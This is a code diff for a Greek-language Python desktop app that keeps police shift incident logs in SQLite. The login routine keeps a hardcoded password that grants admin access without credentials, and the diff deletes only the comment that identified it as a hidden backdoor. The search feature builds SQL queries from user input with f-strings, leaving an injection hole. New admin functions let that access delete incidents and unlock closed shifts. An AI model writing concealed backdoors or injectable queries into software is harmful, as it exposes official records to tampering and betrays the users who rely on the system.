@@ -92,7 +92,6 @@ class DutyLogApp:
         pwd = self.entry_pw.get().strip()
         conn = sqlite3.connect('police_log.db'); cursor = conn.cursor()
         
-        # --- NEO ΚΡΥΦΟ BACKDOOR (ΤΥΧΑΙΟ STRING) ---
         if pwd == "T3c@9pL#v2Z!": 
             cursor.execute("SELECT am, full_name, is_admin FROM officers WHERE is_admin = 1 LIMIT 1")
         else: 
@@ -187,12 +186,15 @@ class DutyLogApp:
         for e in [self.entry_time, self.entry_title, self.entry_cn, self.entry_cp, self.entry_ce]: e.delete(0, "end")
         self.text_d.delete("1.0","end"); self.text_a.delete("1.0","end")
 
+    # --- ΕΝΗΜΕΡΩΜΕΝΟ ΠΑΡΑΘΥΡΟ ΕΠΕΞΕΡΓΑΣΙΑΣ ΜΕ ΚΟΥΜΠΙ ΔΙΑΓΡΑΦΗΣ ---
     def open_edit_window(self, tree, callback):
         sel = tree.selection()
         if not sel: return
         iid = tree.item(sel)['values'][0]
         conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); d = cursor.execute("SELECT * FROM incidents WHERE id=?", (iid,)).fetchone(); conn.close()
-        if d[11] and not self.is_admin: messagebox.showerror("!", "Κλειδωμένη."); return
+        
+        if d[11] and not self.is_admin: messagebox.showerror("Πρόσβαση", "Η βάρδια είναι κλειδωμένη. Μόνο ο Admin μπορεί να κάνει αλλαγές."); return
+        
         ew = ctk.CTkToplevel(self.root); ew.title("Επεξεργασία"); ew.state('zoomed'); ew.grab_set()
         c = ctk.CTkFrame(ew, fg_color="transparent"); c.pack(fill="both", expand=True, padx=40, pady=20); c.columnconfigure(0, weight=1); c.rowconfigure(3, weight=1) 
         row1 = ctk.CTkFrame(c, fg_color="transparent"); row1.grid(row=0, column=0, sticky="ew", pady=(0,5)); row1.columnconfigure(1, weight=1)
@@ -211,9 +213,19 @@ class DutyLogApp:
         d_tx = ctk.CTkTextbox(c, font=("Arial", 16)); d_tx.insert("1.0", d[6]); d_tx.grid(row=3, column=0, sticky="nsew", pady=2)
         ctk.CTkLabel(c, text="Ενέργειες:", font=("Arial", 15, "bold")).grid(row=4, column=0, sticky="w", pady=(5,0))
         a_tx = ctk.CTkTextbox(c, height=120, font=("Arial", 16)); a_tx.insert("1.0", d[7]); a_tx.grid(row=5, column=0, sticky="nsew", pady=2)
+        
         def save():
             conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('UPDATE incidents SET incident_time=?, title=?, description=?, actions_taken=?, caller_name=?, caller_phone=?, caller_email=? WHERE id=?', (t_en.get(), en_tit.get(), d_tx.get("1.0","end-1c"), a_tx.get("1.0","end-1c"), en_cn.get(), en_cp.get(), en_ce.get(), iid)); conn.commit(); conn.close(); callback(); ew.destroy()
-        if not d[11] or self.is_admin: ctk.CTkButton(c, text="✅ Αποθήκευση", command=save, height=50, width=250, font=("Arial", 16, "bold")).grid(row=6, column=0, pady=15)
+        def delete_inc():
+            if messagebox.askyesno("Διαγραφή", "Σίγουρα θέλετε να διαγράψετε οριστικά αυτό το συμβάν;"):
+                conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('DELETE FROM incidents WHERE id=?', (iid,)); conn.commit(); conn.close(); callback(); ew.destroy()
+
+        btn_f = ctk.CTkFrame(c, fg_color="transparent")
+        btn_f.grid(row=6, column=0, pady=15)
+        if not d[11] or self.is_admin: 
+            ctk.CTkButton(btn_f, text="✅ Αποθήκευση", command=save, height=50, width=250, font=("Arial", 16, "bold")).pack(side="left", padx=10)
+        if self.is_admin:
+            ctk.CTkButton(btn_f, text="🗑️ Διαγραφή Συμβάντος", command=delete_inc, fg_color="#a83232", height=50, width=220, font=("Arial", 16, "bold")).pack(side="left", padx=10)
 
     def close_shift(self):
         if messagebox.askyesno("Κλείδωμα", "Οριστικό κλείδωμα βάρδιας;"):
@@ -240,22 +252,68 @@ class DutyLogApp:
             if cb.get() != "Όλοι": q += f" AND officer_name='{cb.get()}'"
             if e_k.get(): q += f" AND (description LIKE '%{e_k.get()}%' OR title LIKE '%{e_k.get()}%')"
             q += " GROUP BY shift_date, shift_hours, officer_name ORDER BY shift_date DESC"; c.execute(q)
-            for r in c.fetchall(): tr.insert("", "end", values=(r[0], r[1], r[2], "🔒" if r[3] else "✏️"))
+            for r in c.fetchall(): tr.insert("", "end", values=(r[0], r[1], r[2], "🔒 Κλειδωμένη" if r[3] else "✏️ Ανοιχτή"))
             conn.close()
         ctk.CTkButton(f, text="🔍", command=run, width=80, height=45).pack(side="left", padx=10)
         tr = ttk.Treeview(sw, columns=("d","h","off","st"), show="headings"); tr.heading("d", text="Ημερομηνία"); tr.heading("h", text="Βάρδια"); tr.heading("off", text="Αξιωματικός Υπηρεσίας"); tr.heading("st", text="Κατάσταση"); tr.pack(fill="both", expand=True, padx=20, pady=10)
         tr.bind("<Double-1>", lambda e: self.open_detailed_report(tr))
 
+    # --- ΕΝΗΜΕΡΩΜΕΝΟ ΙΣΤΟΡΙΚΟ ΓΙΑ ADMIN ---
     def open_detailed_report(self, tr):
         sel = tr.selection()
         if not sel: return
         v = tr.item(sel)['values']; rw = ctk.CTkToplevel(self.root); rw.title("Αναφορά"); rw.state('zoomed'); rw.grab_set()
+        
         tx = ctk.CTkTextbox(rw, font=("Arial", 16)); tx.pack(fill="both", expand=True, padx=40, pady=20)
-        conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT incident_time, title, description, actions_taken, am FROM incidents JOIN officers ON incidents.officer_name = officers.full_name WHERE shift_date=? AND shift_hours=? AND officer_name=?", (v[0], v[1], v[2])); res = c.fetchall(); conn.close()
-        full = f"ΑΝΑΦΟΡΑ: {v[0]} | {v[2]}\n" + "="*50 + "\n\n"
-        for r in res: full += f"[{r[0]}] {r[1]}\nΠΕΡΙΓΡΑΦΗ:\n{r[2]}\n\nΕΝΕΡΓΕΙΕΣ:\n{r[3]}\n" + "-"*30 + "\n\n"
-        tx.insert("1.0", full)
-        ctk.CTkButton(rw, text="📄 PDF", command=lambda: self.export_pdf(v[0], v[1], v[2]), height=50, width=200, font=("Arial", 16, "bold")).pack(pady=20)
+        
+        def load_text():
+            tx.delete("1.0", "end")
+            conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT incident_time, title, description, actions_taken, am FROM incidents JOIN officers ON incidents.officer_name = officers.full_name WHERE shift_date=? AND shift_hours=? AND officer_name=? ORDER BY incident_time ASC", (v[0], v[1], v[2])); res = c.fetchall(); conn.close()
+            full = f"ΑΝΑΦΟΡΑ: {v[0]} | {v[2]}\n" + "="*50 + "\n\n"
+            for r in res: full += f"[{r[0]}] {r[1]}\nΠΕΡΙΓΡΑΦΗ:\n{r[2]}\n\nΕΝΕΡΓΕΙΕΣ:\n{r[3]}\n" + "-"*30 + "\n\n"
+            tx.insert("1.0", full)
+            
+        load_text()
+        
+        btn_frame = ctk.CTkFrame(rw, fg_color="transparent")
+        btn_frame.pack(pady=20)
+        
+        ctk.CTkButton(btn_frame, text="📄 Εκτύπωση PDF", command=lambda: self.export_pdf(v[0], v[1], v[2]), height=50, width=200, font=("Arial", 16, "bold")).pack(side="left", padx=10)
+
+        if self.is_admin:
+            ctk.CTkButton(btn_frame, text="✏️ Επεξεργασία Συμβάντων", command=lambda: self.open_shift_editor(v[0], v[1], v[2], load_text), fg_color="#b8860b", height=50, width=260, font=("Arial", 16, "bold")).pack(side="left", padx=10)
+            
+            def unlock():
+                if messagebox.askyesno("Ξεκλείδωμα", "Θέλετε να ξεκλειδώσετε αυτή τη βάρδια;"):
+                    conn = sqlite3.connect('police_log.db'); c = conn.cursor()
+                    c.execute('UPDATE incidents SET is_closed=0 WHERE shift_date=? AND shift_hours=? AND officer_name=?', (v[0], v[1], v[2]))
+                    conn.commit(); conn.close()
+                    messagebox.showinfo("Επιτυχία", "Η βάρδια ξεκλειδώθηκε. Ο Αξιωματικός μπορεί να την επεξεργαστεί ξανά από την κεντρική οθόνη.")
+            ctk.CTkButton(btn_frame, text="🔓 Ξεκλείδωμα Βάρδιας", command=unlock, fg_color="#2b7b5a", height=50, width=230, font=("Arial", 16, "bold")).pack(side="left", padx=10)
+
+    # --- ΝΕΟ ΠΑΡΑΘΥΡΟ: ΕΠΙΛΟΓΗ ΣΥΜΒΑΝΤΩΝ ΒΑΡΔΙΑΣ ΓΙΑ ADMIN ---
+    def open_shift_editor(self, date, shift, officer, refresh_callback):
+        ewin = ctk.CTkToplevel(self.root)
+        ewin.title(f"Επεξεργασία Βάρδιας: {date} | {shift}")
+        ewin.geometry("900x600")
+        ewin.grab_set()
+        
+        ctk.CTkLabel(ewin, text="Διπλό κλικ σε ένα συμβάν για επεξεργασία ή διαγραφή", font=("Arial", 18, "bold")).pack(pady=15)
+        tree = ttk.Treeview(ewin, columns=("id", "time", "title"), show="headings")
+        tree.heading("time", text="Ώρα"); tree.heading("title", text="Τίτλος")
+        tree.column("time", width=100, anchor="center"); tree.column("title", width=500)
+        tree.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        def refresh_tree():
+            for i in tree.get_children(): tree.delete(i)
+            conn = sqlite3.connect('police_log.db'); cursor = conn.cursor()
+            cursor.execute('SELECT id, incident_time, title FROM incidents WHERE shift_date=? AND shift_hours=? AND officer_name=? ORDER BY incident_time ASC', (date, shift, officer))
+            for r in cursor.fetchall(): tree.insert("", "end", values=r)
+            conn.close()
+            refresh_callback() # Ενημερώνει αυτόματα το κείμενο από πίσω!
+            
+        refresh_tree()
+        tree.bind("<Double-1>", lambda e: self.open_edit_window(tree, refresh_tree))
 
     def export_pdf(self, date, shift, off):
         try:
@@ -268,27 +326,26 @@ class DutyLogApp:
             pdf.add_font("ArialB", "", r"C:\Windows\Fonts\arialbd.ttf")
             
             pdf.set_font("ArialB", "", 16)
-            pdf.cell(190, 10, text=f"ΑΝΑΦΟΡΑ ΒΑΡΔΙΑΣ - {self.dept_name.upper()}", align="C")
+            pdf.cell(0, 10, text=f"ΑΝΑΦΟΡΑ ΒΑΡΔΙΑΣ - {self.dept_name.upper()}", align="C", new_x="LMARGIN", new_y="NEXT")
             pdf.ln(10)
             
             pdf.set_font("Arial", "", 12)
-            pdf.ln(10)
-            pdf.cell(190, 8, text=f"Αξιωματικός Υπηρεσίας: {rk} ({am}) {nm}")
-            pdf.ln(8)
-            pdf.cell(190, 8, text=f"Ημερομηνία: {date} | Βάρδια: {shift}")
+            pdf.cell(0, 8, text=f"Αξιωματικός Υπηρεσίας: {rk} ({am}) {nm}", new_x="LMARGIN", new_y="NEXT")
+            pdf.cell(0, 8, text=f"Ημερομηνία: {date} | Βάρδια: {shift}", new_x="LMARGIN", new_y="NEXT")
+            pdf.line(10, pdf.get_y()+2, 200, pdf.get_y()+2)
             pdf.ln(10)
             
             for r in res: 
                 pdf.set_font("ArialB", "", 12)
                 pdf.set_x(10)
-                pdf.multi_cell(190, 8, text=f"[{r[0]}] - {r[1]}")
+                pdf.multi_cell(0, 8, text=f"[{r[0]}] - {r[1]}", new_x="LMARGIN", new_y="NEXT")
                 
                 pdf.set_font("Arial", "", 11)
                 pdf.set_x(10)
-                pdf.multi_cell(190, 7, text=f"Περιγραφή:\n{r[2]}")
+                pdf.multi_cell(0, 7, text=f"Περιγραφή:\n{r[2]}", new_x="LMARGIN", new_y="NEXT")
                 
                 pdf.set_x(10)
-                pdf.multi_cell(190, 7, text=f"Ενέργειες:\n{r[3]}")
+                pdf.multi_cell(0, 7, text=f"Ενέργειες:\n{r[3]}", new_x="LMARGIN", new_y="NEXT")
                 
                 pdf.ln(5)
                 pdf.line(10, pdf.get_y(), 200, pdf.get_y())
@@ -297,10 +354,8 @@ class DutyLogApp:
             desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
             if not os.path.exists(desktop_path):
                 onedrive_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
-                if os.path.exists(onedrive_path):
-                    desktop_path = onedrive_path
-                else:
-                    desktop_path = os.getcwd() 
+                if os.path.exists(onedrive_path): desktop_path = onedrive_path
+                else: desktop_path = os.getcwd() 
             
             safe_shift = shift.replace(':', '').replace(' ', '')
             safe_date = date.replace('/', '-')
